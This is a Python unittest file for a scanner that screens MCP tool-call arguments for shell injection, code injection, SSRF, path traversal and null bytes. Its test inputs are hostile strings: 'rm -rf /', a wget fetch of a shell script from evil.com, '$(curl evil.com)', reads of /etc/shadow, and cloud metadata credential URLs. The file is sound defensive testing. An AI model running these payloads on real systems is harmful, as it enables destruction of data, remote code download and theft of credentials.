"""
Tests for core/mcp_arg_scanner.py

Stdlib-only — no pydantic / fastapi / sentence-transformers required.
Run with: python -m pytest tests/test_mcp_arg_scanner.py -v
"""

import unittest

from core.mcp_arg_scanner import (
    scan_arguments,
    ArgFinding,
    ArgScanResult,
    MAX_VALUE_LENGTH,
    MAX_DEPTH,
)


# ── Helpers ────────────────────────────────────────────────────────────────────

def _categories(result: ArgScanResult) -> set[str]:
    return {f.category for f in result.findings}


def _subcategories(result: ArgScanResult) -> set[str]:
    return {f.subcategory for f in result.findings}


def _has(result: ArgScanResult, category: str) -> bool:
    return any(f.category == category for f in result.findings)


# ══════════════════════════════════════════════════════════════════════════════
# Clean arguments — must produce zero findings
# ══════════════════════════════════════════════════════════════════════════════

class TestCleanArguments(unittest.TestCase):

    def test_simple_string_value_is_clean(self):
        r = scan_arguments({"path": "/documents/report.pdf"})
        self.assertEqual(r.highest_severity, "clean")
        self.assertFalse(r.findings)

    def test_empty_arguments_is_clean(self):
        r = scan_arguments({})
        self.assertEqual(r.highest_severity, "clean")
        self.assertFalse(r.blocked)

    def test_none_arguments_is_clean(self):
        r = scan_arguments(None)
        self.assertEqual(r.highest_severity, "clean")
        self.assertFalse(r.findings)

    def test_numeric_values_are_clean(self):
        r = scan_arguments({"limit": 100, "offset": 0})
        self.assertEqual(r.highest_severity, "clean")

    def test_boolean_values_are_clean(self):
        r = scan_arguments({"recursive": True, "follow_links": False})
        self.assertEqual(r.highest_severity, "clean")

    def test_nested_clean_dict_is_clean(self):
        r = scan_arguments({"options": {"format": "pdf", "pages": "all"}})
        self.assertEqual(r.highest_severity, "clean")
        self.assertFalse(r.findings)

    def test_external_api_url_is_not_ssrf(self):
        r = scan_arguments({"url": "https://api.example.com/v1/data"})
        self.assertFalse(_has(r, "SSRF"))

    def test_clean_text_with_normal_newlines(self):
        r = scan_arguments({"content": "Line one.\nLine two.\nLine three."})
        self.assertEqual(r.highest_severity, "clean")

    def test_word_cat_in_query_is_not_shell_injection(self):
        # "cat" in natural language is not injection
        r = scan_arguments({"query": "cat breeds"})
        self.assertFalse(_has(r, "SHELL_INJECTION"))

    def test_os_dot_path_is_not_code_injection(self):
        # os.path.join is documentation text, not a dangerous call
        r = scan_arguments({"description": "Use os.path.join to combine paths."})
        self.assertFalse(_has(r, "CODE_INJECTION"))

    def test_tool_name_stored_in_result(self):
        r = scan_arguments({"q": "hello"}, tool_name="search_tool")
        self.assertEqual(r.tool_name, "search_tool")


# ══════════════════════════════════════════════════════════════════════════════
# Shell injection — critical severity
# ══════════════════════════════════════════════════════════════════════════════

class TestShellInjection(unittest.TestCase):

    def test_semicolon_then_rm(self):
        r = scan_arguments({"path": "/tmp/file; rm -rf /"})
        self.assertTrue(_has(r, "SHELL_INJECTION"))
        self.assertEqual(r.highest_severity, "critical")
        self.assertTrue(r.blocked)

    def test_command_substitution_dollar_parens(self):
        r = scan_arguments({"name": "$(id)"})
        self.assertTrue(_has(r, "SHELL_INJECTION"))
        self.assertIn("CMD_SUBSTITUTION", _subcategories(r))
        self.assertEqual(r.highest_severity, "critical")

    def test_backtick_substitution(self):
        r = scan_arguments({"filename": "`whoami`"})
        self.assertTrue(_has(r, "SHELL_INJECTION"))
        self.assertIn("BACKTICK_SUBSTITUTION", _subcategories(r))

    def test_pipe_to_bash(self):
        r = scan_arguments({"cmd": "echo hello | bash"})
        self.assertTrue(_has(r, "SHELL_INJECTION"))
        self.assertEqual(r.highest_severity, "critical")

    def test_and_chain_wget(self):
        r = scan_arguments({"arg": "safe_value && wget http://evil.com/shell.sh"})
        self.assertTrue(_has(r, "SHELL_INJECTION"))

    def test_variable_expansion(self):
        r = scan_arguments({"path": "/home/${USER}/.ssh/id_rsa"})
        self.assertTrue(_has(r, "SHELL_INJECTION"))
        self.assertIn("VAR_EXPANSION", _subcategories(r))

    def test_newline_inject_with_command(self):
        r = scan_arguments({"title": "report\ncat /etc/passwd"})
        self.assertTrue(_has(r, "SHELL_INJECTION"))
        self.assertIn("NEWLINE_INJECT", _subcategories(r))

    def test_nested_dict_value_with_injection(self):
        r = scan_arguments({"opts": {"filename": "data; cat /etc/shadow"}})
        self.assertTrue(_has(r, "SHELL_INJECTION"))

    def test_list_value_with_injection(self):
        r = scan_arguments({"files": ["report.pdf", "data; rm -rf /"]})
        self.assertTrue(_has(r, "SHELL_INJECTION"))

    def test_shell_injection_in_query_field(self):
        r = scan_arguments({"query": "SELECT 1; bash -c 'id'"})
        self.assertTrue(_has(r, "SHELL_INJECTION"))

    def test_finding_has_arg_path(self):
        r = scan_arguments({"nested": {"deep": "$(curl evil.com)"}})
        paths = {f.arg_path for f in r.findings}
        self.assertTrue(any("nested" in p and "deep" in p for p in paths))

    def test_finding_excerpt_is_not_empty(self):
        r = scan_arguments({"x": "$(id)"})
        self.assertTrue(all(f.excerpt for f in r.findings))


# ══════════════════════════════════════════════════════════════════════════════
# Code injection — high severity
# ══════════════════════════════════════════════════════════════════════════════

class TestCodeInjection(unittest.TestCase):

    def test_eval_call(self):
        r = scan_arguments({"expr": "eval('__import__(\"os\").system(\"id\")')"})
        self.assertTrue(_has(r, "CODE_INJECTION"))
        self.assertIn(r.highest_severity, {"high", "critical"})
        self.assertTrue(r.blocked)

    def test_exec_call(self):
        r = scan_arguments({"code": "exec('import os; os.system(\"ls\")')"})
        self.assertTrue(_has(r, "CODE_INJECTION"))
        self.assertIn("EXEC", _subcategories(r))

    def test_os_system_call(self):
        r = scan_arguments({"script": "os.system('cat /etc/passwd')"})
        self.assertTrue(_has(r, "CODE_INJECTION"))
        self.assertIn("OS_EXEC", _subcategories(r))
        self.assertTrue(r.blocked)

    def test_subprocess_run(self):
        r = scan_arguments({"code": "subprocess.run(['ls', '-la'])"})
        self.assertTrue(_has(r, "CODE_INJECTION"))
        self.assertIn("SUBPROCESS", _subcategories(r))

    def test_os_popen(self):
        r = scan_arguments({"snippet": "data = os.popen('id').read()"})
        self.assertTrue(_has(r, "CODE_INJECTION"))

    def test_import_inject(self):
        r = scan_arguments({"payload": "__import__('os').system('id')"})
        self.assertTrue(_has(r, "CODE_INJECTION"))
        self.assertIn("IMPORT_INJECT", _subcategories(r))

    def test_normal_text_mentioning_eval_not_flagged(self):
        # "eval" as a word without parenthesis should not flag
        r = scan_arguments({"description": "We should eval the approach carefully."})
        self.assertFalse(_has(r, "CODE_INJECTION"))

    def test_code_injection_severity_is_high(self):
        r = scan_arguments({"s": "exec('pass')"})
        code_findings = [f for f in r.findings if f.category == "CODE_INJECTION"]
        self.assertTrue(all(f.severity == "high" for f in code_findings))


# ══════════════════════════════════════════════════════════════════════════════
# SSRF — high severity
# ══════════════════════════════════════════════════════════════════════════════

class TestSSRF(unittest.TestCase):

    def test_aws_metadata_ip(self):
        r = scan_arguments({"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"})
        self.assertTrue(_has(r, "SSRF"))
        self.assertIn("AWS_GCP_IMDS", _subcategories(r))
        self.assertTrue(r.blocked)

    def test_localhost_url(self):
        r = scan_arguments({"endpoint": "http://localhost:8080/internal"})
        self.assertTrue(_has(r, "SSRF"))
        self.assertIn("LOCALHOST_URL", _subcategories(r))

    def test_127_0_0_1_url(self):
        r = scan_arguments({"target": "http://127.0.0.1/admin"})
        self.assertTrue(_has(r, "SSRF"))
        self.assertIn("LOCALHOST_URL", _subcategories(r))

    def test_internal_rfc1918_url(self):
        r = scan_arguments({"fetch": "http://10.0.0.1/credentials"})
        self.assertTrue(_has(r, "SSRF"))
        self.assertIn("INTERNAL_IP_URL", _subcategories(r))

    def test_gcp_metadata_endpoint(self):
        r = scan_arguments({"url": "http://metadata.google.internal/computeMetadata/v1/"})
        self.assertTrue(_has(r, "SSRF"))
        self.assertIn("GCP_METADATA", _subcategories(r))

    def test_external_api_is_not_ssrf(self):
        r = scan_arguments({"url": "https://api.openai.com/v1/models"})
        self.assertFalse(_has(r, "SSRF"))

    def test_ssrf_severity_is_high(self):
        r = scan_arguments({"u": "http://169.254.169.254/"})
        ssrf_findings = [f for f in r.findings if f.category == "SSRF"]
        self.assertTrue(all(f.severity == "high" for f in ssrf_findings))

    def test_raw_metadata_ip_without_url_scheme(self):
        # Plain IP in an argument — still dangerous
        r = scan_arguments({"host": "169.254.169.254"})
        self.assertTrue(_has(r, "SSRF"))


# ══════════════════════════════════════════════════════════════════════════════
# Path traversal — high severity
# ══════════════════════════════════════════════════════════════════════════════

class TestPathTraversal(unittest.TestCase):

    def test_dot_dot_slash_in_filename(self):
        r = scan_arguments({"file": "../../etc/passwd"})
        self.assertTrue(_has(r, "PATH_TRAVERSAL"))
        self.assertIn("DOT_DOT", _subcategories(r))
        self.assertTrue(r.blocked)

    def test_dot_dot_backslash_on_windows(self):
        r = scan_arguments({"path": "..\\..\\Windows\\System32"})
        self.assertTrue(_has(r, "PATH_TRAVERSAL"))
        self.assertIn("DOT_DOT", _subcategories(r))

    def test_etc_passwd_absolute_path(self):
        r = scan_arguments({"filename": "/etc/passwd"})
        self.assertTrue(_has(r, "PATH_TRAVERSAL"))
        self.assertIn("SENSITIVE_UNIX_PATH", _subcategories(r))

    def test_etc_shadow(self):
        r = scan_arguments({"target": "/etc/shadow"})
        self.assertTrue(_has(r, "PATH_TRAVERSAL"))

    def test_url_encoded_traversal(self):
        r = scan_arguments({"path": "%2e%2e%2fetc%2fpasswd"})
        self.assertTrue(_has(r, "PATH_TRAVERSAL"))
        self.assertIn("ENCODED_TRAVERSAL", _subcategories(r))

    def test_legitimate_path_with_single_dot_is_clean(self):
        r = scan_arguments({"path": "./config/settings.json"})
        self.assertFalse(_has(r, "PATH_TRAVERSAL"))

    def test_path_traversal_severity_is_high(self):
        r = scan_arguments({"f": "../../secret"})
        pt_findings = [f for f in r.findings if f.category == "PATH_TRAVERSAL"]
        self.assertTrue(all(f.severity == "high" for f in pt_findings))


# ══════════════════════════════════════════════════════════════════════════════
# Null byte — medium severity
# ══════════════════════════════════════════════════════════════════════════════

class TestNullByte(unittest.TestCase):

    def test_null_byte_in_string_detected(self):
        r = scan_arguments({"name": "file\x00.txt"})
        self.assertTrue(_has(r, "NULL_BYTE"))
        self.assertEqual(r.highest_severity, "medium")

    def test_null_byte_at_start(self):
        r = scan_arguments({"key": "\x00secret"})
        self.assertTrue(_has(r, "NULL_BYTE"))

    def test_null_byte_does_not_block(self):
        r = scan_arguments({"k": "test\x00"})
        self.assertFalse(r.blocked)

    def test_no_null_byte_is_clean(self):
        r = scan_arguments({"name": "normal-filename.pdf"})
        self.assertFalse(_has(r, "NULL_BYTE"))


# ══════════════════════════════════════════════════════════════════════════════
# Multiple patterns and severity ordering
# ══════════════════════════════════════════════════════════════════════════════

class TestSeverityOrdering(unittest.TestCase):

    def test_critical_wins_over_high(self):
        # Both shell injection (critical) and path traversal (high) present
        r = scan_arguments({"path": "../../secret; rm -rf /"})
        self.assertEqual(r.highest_severity, "critical")
        self.assertIn("SHELL_INJECTION", _categories(r))
        self.assertIn("PATH_TRAVERSAL", _categories(r))

    def test_high_wins_over_medium(self):
        # SSRF (high) and null byte (medium)
        r = scan_arguments({"url": "http://169.254.169.254/\x00"})
        self.assertEqual(r.highest_severity, "high")  # or critical if SSRF is high

    def test_findings_sorted_highest_severity_first(self):
        r = scan_arguments({"p": "$(id)", "f": "\x00"})
        if len(r.findings) > 1:
            sev_values = [r.findings[i].severity for i in range(len(r.findings))]
            # Critical should come before medium
            order = [_SEV_ORDER[s] for s in sev_values]
            self.assertEqual(order, sorted(order, reverse=True))

    def test_multiple_findings_all_returned(self):
        r = scan_arguments({
            "url": "http://169.254.169.254/",
            "path": "../../etc/passwd",
        })
        self.assertGreaterEqual(len(r.findings), 2)

    def test_blocked_on_high_severity(self):
        r = scan_arguments({"url": "http://10.0.0.1/admin"})
        self.assertTrue(r.blocked)

    def test_not_blocked_on_medium_only(self):
        r = scan_arguments({"k": "test\x00value"})
        self.assertFalse(r.blocked)

    def test_clean_result_has_zero_findings(self):
        r = scan_arguments({"q": "quarterly report summary"})
        self.assertEqual(len(r.findings), 0)
        self.assertFalse(r.blocked)


# ══════════════════════════════════════════════════════════════════════════════
# Recursive structure handling
# ══════════════════════════════════════════════════════════════════════════════

class TestRecursiveStructures(unittest.TestCase):

    def test_deeply_nested_dict_value(self):
        r = scan_arguments({"a": {"b": {"c": {"d": "$(id)"}}}})
        self.assertTrue(_has(r, "SHELL_INJECTION"))

    def test_list_of_strings(self):
        r = scan_arguments({"files": ["clean.txt", "../../etc/passwd", "other.txt"]})
        self.assertTrue(_has(r, "PATH_TRAVERSAL"))

    def test_mixed_types_in_list(self):
        r = scan_arguments({"items": [1, True, "clean", None, "$(evil)"]})
        self.assertTrue(_has(r, "SHELL_INJECTION"))

    def test_integer_values_ignored(self):
        r = scan_arguments({"count": 42, "limit": 100})
        self.assertEqual(r.highest_severity, "clean")

    def test_arg_path_reflects_nesting(self):
        r = scan_arguments({"opts": {"path": "../../secret"}})
        paths = {f.arg_path for f in r.findings}
        self.assertTrue(any("opts" in p and "path" in p for p in paths))

    def test_list_arg_path_includes_index(self):
        r = scan_arguments({"files": ["ok.txt", "$(id)"]})
        paths = {f.arg_path for f in r.findings}
        self.assertTrue(any("[1]" in p for p in paths))


# ══════════════════════════════════════════════════════════════════════════════
# Module constants
# ══════════════════════════════════════════════════════════════════════════════

class TestConstants(unittest.TestCase):

    def test_max_value_length_is_positive(self):
        self.assertGreater(MAX_VALUE_LENGTH, 0)

    def test_max_value_length_is_at_least_1024(self):
        self.assertGreaterEqual(MAX_VALUE_LENGTH, 1024)

    def test_max_depth_is_positive(self):
        self.assertGreater(MAX_DEPTH, 0)

    def test_max_depth_at_least_3(self):
        self.assertGreaterEqual(MAX_DEPTH, 3)

    def test_truncation_does_not_raise_on_large_value(self):
        large = "A" * (MAX_VALUE_LENGTH * 10)
        r = scan_arguments({"big": large})
        self.assertEqual(r.highest_severity, "clean")


# ══════════════════════════════════════════════════════════════════════════════
# ArgFinding and ArgScanResult structure
# ══════════════════════════════════════════════════════════════════════════════

class TestResultStructure(unittest.TestCase):

    def test_finding_has_required_fields(self):
        r = scan_arguments({"p": "$(id)"})
        self.assertTrue(r.findings)
        f = r.findings[0]
        self.assertIsInstance(f.category, str)
        self.assertIsInstance(f.subcategory, str)
        self.assertIsInstance(f.severity, str)
        self.assertIsInstance(f.arg_path, str)
        self.assertIsInstance(f.excerpt, str)

    def test_scan_result_has_tool_name(self):
        r = scan_arguments({}, tool_name="my_tool")
        self.assertEqual(r.tool_name, "my_tool")

    def test_blocked_false_when_clean(self):
        r = scan_arguments({"q": "hello world"})
        self.assertFalse(r.blocked)
        self.assertEqual(r.highest_severity, "clean")

    def test_severity_values_are_valid(self):
        valid = {"clean", "medium", "high", "critical"}
        for test_args, _ in [
            ({"p": "$(id)"}, "critical"),
            ({"url": "http://169.254.169.254/"}, "high"),
            ({"k": "\x00"}, "medium"),
            ({"q": "clean"}, "clean"),
        ]:
            r = scan_arguments(test_args)
            self.assertIn(r.highest_severity, valid)


if __name__ == "__main__":
    unittest.main()

# ── Severity order reference ──────────────────────────────────────────────────
from core.mcp_arg_scanner import _SEV_ORDER  # noqa: E402 — used in TestSeverityOrdering
